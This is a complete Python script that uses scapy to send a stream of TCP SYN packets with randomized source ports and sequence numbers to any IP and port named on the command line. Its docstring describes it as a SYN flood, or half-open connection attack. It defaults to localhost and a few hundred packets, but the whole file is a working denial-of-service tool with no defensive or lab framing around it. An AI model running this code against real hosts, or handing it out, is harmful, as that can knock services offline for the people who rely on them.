import sys
import random
import time
from scapy.all import IP, TCP, send

def launch_syn_flood(target_ip, target_port=80, packet_count=500, delay=0.005):
    """
    Sends raw TCP SYN packets with randomized source ports and sequence numbers.
    Simulates a SYN Flood / Half-open connection attack.
    """
    print(f"[*] Starting SYN Flood against {target_ip}:{target_port} ({packet_count} packets)...")
    sent = 0
    try:
        for _ in range(packet_count):
            src_port = random.randint(1024, 65535)
            seq_num = random.randint(1000, 900000)
            
            # Construct TCP SYN Packet (Flags="S")
            packet = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)
            send(packet, verbose=False)
            sent += 1
            if delay > 0:
                time.sleep(delay)
        print(f"[+] SYN Flood completed. Total packets sent: {sent}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user. Sent: {sent}")
    except Exception as e:
        print(f"[-] Error during SYN flood: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 300
    launch_syn_flood(target, port, count)
